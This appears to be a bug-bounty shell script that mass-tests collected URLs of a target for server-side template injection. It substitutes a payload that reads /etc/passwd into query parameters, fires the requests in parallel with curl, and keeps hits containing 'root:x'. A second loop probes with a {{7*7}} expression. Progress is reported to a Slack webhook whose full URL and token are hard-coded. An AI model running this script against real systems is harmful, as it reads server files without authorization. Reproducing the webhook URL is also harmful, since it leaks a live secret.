#!/bin/sh

TARGET=$1
title=ssti
mkdir -pv "${TARGET}/${title}"
LOGFILE=backuplog

curl -X POST -H 'Content-type: application/json' --data '{"text":"[+] 1. SSTI Scanning Started '$1'"}' https://hooks.slack.com/services/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
echo "[+] Started with SSTI Scanning on allxssfinal_${TARGET}.txt"
cat ./${TARGET}/xss/allxssfinal_${TARGET}.txt | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x" >  ./${TARGET}/${title}/ssti_${TARGET}.txt

cat  ./${TARGET}/xss/allxssfinal_${TARGET}.txt | grep "=" | egrep -v '(.js|.png|.svg|.gif|.jpg|.jpeg|.txt|.css|.ico)' | qsreplace "ssti{{7*7}}" | while read url; do cur=$(curl -s $url | grep  "ssti49"); echo -e "url -> $cur"; done >  ./${TARGET}/${title}/ssti2_${TARGET}.txt

#mv ssti_${TARGET}.txt ssti2_${TARGET}.txt ./${TARGET}/${title}/

echo "[!] Done SSTI"
curl -X POST -H 'Content-type: application/json' --data '{"text":"[+] 1. SSTI Scanning Completed '$1'"}' https://hooks.slack.com/services/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
